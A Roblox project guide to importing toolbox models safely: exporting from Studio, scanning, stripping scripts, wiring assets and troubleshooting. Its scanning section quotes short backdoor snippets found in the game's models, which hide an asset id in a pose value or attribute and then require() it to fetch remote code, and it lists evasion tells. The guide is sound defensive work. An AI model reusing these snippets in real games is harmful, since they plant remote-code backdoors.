# How to load a model

Getting a 3D model out of Roblox Studio and into this game, safely.

Everything here is one-way by design: models are authored or found in Studio,
then committed to this repo as text. Once a model is in `assets/`, Rojo mounts
it on every build and it works identically for everyone who clones the repo —
no place file passed around, no ids that can be moderated away.

---

## The short version

```powershell
# 1. In Studio: right-click the model IN THE EXPLORER -> Save to File...
#    -> assets/Models/YourModel.rbxmx

# 2. Scan it. Never skip this.
python tools/model-hygiene/scan_model.py assets/Models/YourModel.rbxmx
python tools/model-hygiene/dump_attrs.py assets/Models/YourModel.rbxmx

# 3. Strip every script out of it.
python tools/model-hygiene/strip_scripts.py `
    assets/Models/YourModel.rbxmx `
    "$env:TEMP/YourModel.quarantine"

# 4. Add a row in src/shared/Modules/Config/Assets.lua with template = "YourModel"

# 5. Build and check.
.\reload.ps1 -Check
```

---

## 1. Export from Studio

Right-click the model **in the Explorer panel**, not in the 3D viewport. The
viewport context menu has no "Save to File" — that is the usual reason people
think the option does not exist.

Save into:

| Folder | For | Mounts at |
|---|---|---|
| `assets/Models/` | characters, props, anything 3D | `ReplicatedStorage.Assets.Models.<Name>` |
| `assets/UI/` | GUI templates | `ReplicatedStorage.Assets.UI.<Name>` |

**The filename becomes the instance name.** `Usagi.rbxmx` mounts as `Usagi`
regardless of what the model was called inside Studio, so name the file exactly
what you want to reference in code. Match the capitalisation you will use in
`Config/Assets.lua`.

### Which format

| Format | Use for | Diffs |
|---|---|---|
| `.rbxmx` | anything with meshes, unions, textures, decals | XML — tracked, but unreadable diffs |
| `.model.json` | simple UI: frames, labels, layout | line-by-line readable |

`.model.json` cannot express mesh or binary data, so 3D models are effectively
always `.rbxmx`. That is fine — just do not expect a useful diff when you nudge
something.

Both are un-ignored under `assets/` and ignored everywhere else, so a stray
export elsewhere in the repo will not be committed by accident.

### If the source is a binary `.rbxm`

The XML hygiene scripts intentionally do not parse binary files. Do not put a
binary toolbox model straight under `assets/Models/`: use Rojo to decode it
without opening Studio or running its scripts, then extract geometry only.

```powershell
tools\rojo.exe build default.project.json -o "$env:TEMP/model-extract.rbxlx"
python tools/model-hygiene/extract_geometry.py `
    "$env:TEMP/model-extract.rbxlx" `
    "Model name inside the file" `
    assets/Models/YourModel.rbxmx
```

Quarantine or delete the original `.rbxm` outside the repository, then run the
normal scanner and attribute dump on the extracted `.rbxmx`. The extractor
keeps Models, Parts, meshes, textures and decals; scripts, values, bundled UI,
attachments, animation controllers and legacy joints are discarded.

---

## 2. Scan it — this is the important step

**Assume every toolbox model is hostile until you have checked.** All three
character models in this game arrived with a working backdoor, from two
different uploaders.

```powershell
python tools/model-hygiene/scan_model.py assets/Models/YourModel.rbxmx
```

`no scripts - clean` is the result you want. Anything else, read on.

Lines flagged `!!` are reasons to look closer, not proof by themselves. Lines
reported as `no tells matched` are **not** a clean bill of health — the scanner
matches known patterns, and the next variant will be a pattern it does not have.
If a model ships scripts at all, that is already the signal.

Attributes are a separate hiding place and need their own pass:

```powershell
python tools/model-hygiene/dump_attrs.py assets/Models/YourModel.rbxmx
```

A big bare number on an attribute nobody should need — `Version`, `Config`,
`Id` — is almost certainly an asset id waiting to be `require`d.

### What a backdoor actually looks like

The pattern, both times it appeared here: **hide a Roblox asset id somewhere
nobody reads, then `require()` that number at runtime.** `require(<id>)`
downloads and executes whatever the id's owner currently has published, so they
can change the payload whenever they like — including after you have reviewed it.

```lua
-- Chiikawa: id parked in a NumberPose's Value
Instance.new("NumberPose", script.Parent:WaitForChild("qPerfectionWeld",5)).Value = 108773041127041
local TextureConfiguration = require(script:WaitForChild("Pose", 6).Value)

-- Hachiware and Usagi: same trick, id moved into an ATTRIBUTE
local TextureConfiguration = require(script:WaitForChild("TextureConfiguration", 4):GetAttribute("Version"))
```

Supporting tells seen alongside it:

- **Studio evasion** — `if RunService:IsStudio() then return end`, or checking
  `game.JobId`. The payload stays quiet while you test and only runs on a live
  server.
- **Reassigning `script`** to a decoy table, to confuse anything inspecting it.
- **Innocuous, systems-y names** — `CoreViewSystem`, `CoreSkyboxSystem`,
  `TextureConfiguration`, `qPerfectionWeld`.
- **Verbose, tidy English comments.** "Fully Commented Version", "Refactored
  with extensive comments". Camouflage, aimed at surviving a skim.
- **A `ScreenGui` with a `TextBox` and buttons nested inside a `LocalScript`** —
  that is a command bar.

---

## 3. Strip the scripts

Decor and character models never need to ship code. This game builds all
behaviour itself.

```powershell
python tools/model-hygiene/strip_scripts.py `
    assets/Models/YourModel.rbxmx `
    "$env:TEMP/YourModel.quarantine"
```

It copies the original to the quarantine path **outside the repo** first — a
backdoor should never enter Git history — then removes every `Script`,
`LocalScript` and `ModuleScript`, and prints a before/after instance count so
you can confirm the geometry survived.

Check that table. `Part`, `MeshPart`, `SpecialMesh`, `Decal` and `Motor6D`
counts must be unchanged. Things nested *inside* a removed script go with it,
which is usually correct — `Animation` objects parented to a deleted `Animate`
script, for instance — but it is worth seeing rather than assuming.

Re-run the scan afterwards to confirm `no scripts - clean`.

### The runtime already sweeps too, but do not lean on it

`AssetService.prepare` and `CompanionService.rig` both delete every
`LuaSourceContainer` from anything they handle. That is a backstop, not a
substitute:

- It only covers models routed through `AssetService`. Anything you clone
  directly out of `ReplicatedStorage.Assets` is untouched by it.
- It runs on a live server, after the model is already in the place file and in
  your teammates' clones.

Both sweeps used to check `BaseScript`, which covers `Script` and `LocalScript`
but **not `ModuleScript`** — and a `ModuleScript` is exactly where two of these
backdoors kept their payload. That is fixed, and it is a good illustration of
why the file on disk should be clean rather than merely handled at runtime.

---

## 4. Wire it up

Add a row to `src/shared/Modules/Config/Assets.lua`:

```lua
yourmodel = { id = 0, kind = "model", template = "YourModel", scale = 1 },
```

| Field | Meaning |
|---|---|
| `template` | child of `ReplicatedStorage.Assets.Models`. **Set this and no web call happens.** |
| `kind` | `"model"` for one thing, `"pack"` for a container of many |
| `scale` | leave at `1`; `CompanionService` normalises companion height itself |
| `id` | only needed without a `template`. Keep it as a note of where geometry came from |

If you are replacing a fetched id, keep the id in the row and say so in a
comment — knowing the origin matters if the model ever has to be re-sourced.

Using it from code:

```lua
local model = AssetService.clone("yourmodel")
```

For a companion, also add an entry to `Config/Companions.lua` with
`kind = "asset"` and `assetKey = "yourmodel"`.

---

## 5. Verify

```powershell
.\reload.ps1 -Check
```

Builds, regenerates the sourcemap, lints with selene, and type-checks with
luau-lsp — without touching Studio.

To confirm the model actually mounted where you expect, look for it in the
Explorer under `ReplicatedStorage → Assets → Models` after a build, or check the
sourcemap directly. Note that plain `rojo sourcemap` **omits non-script
instances**, so a model will look absent unless you pass `--include-non-scripts`
(`reload.ps1` already does).

At startup the log reports which assets came from the repo rather than the network:

```
[AssetService] decor models: 3 loaded (chiikawa, hachiware, usagi), 0 failed, ...
   Served locally from assets/Models/: chiikawa, hachiware, usagi
```

---

## Troubleshooting

**Only part of the model shows up — a floating head, scattered pieces.**
The model is several unwelded parts, and `CompanionService.rig` unanchors
everything so only the root gets carried. Free models usually hide this behind a
bundled welding script, which you correctly deleted. `rig()` now welds every
part to the root with `WeldConstraint` before unanchoring, so this should be
handled — if it recurs, check the weld pass runs *before* the unanchor loop. A
`WeldConstraint` freezes the relative position it sees when enabled, so welding
after unanchoring captures a pose that has already begun to fall apart.

**`no template "X" under assets/Models/`.**
The `template` string must match the **filename**, case-sensitively, without the
extension.

**Model does not appear at all after a build.**
Check it is in `assets/`, not somewhere Rojo does not map. Only `assets/`,
`src/server`, `src/shared`, `src/client` and `src/gui` are mounted.

**Studio work disappeared.**
Plain `.\reload.ps1` rebuilds the place from disk and **wipes anything in
Workspace that is not in the repo**. Use `.\reload.ps1 -Serve` while iterating,
and export to `assets/` as soon as you like how something looks.

**Animations stopped working after stripping.**
`Animation` objects are usually parented to the `Animate` script that drives
them, so they go together. Companions do not play them anyway — `rig()` deletes
the `Humanoid`. If you want an authored model animated, add the animations
deliberately rather than inheriting them from a free model.

---

## The rule

Anything from the toolbox gets scanned and stripped before it is saved into
`assets/`. A model that ships scripts is telling you something — that is the
signal, not the feature.

This matters more with more than one developer: `assets/` syncs to everyone on
the next pull. The same thing that makes collaboration easy makes contamination
easy.
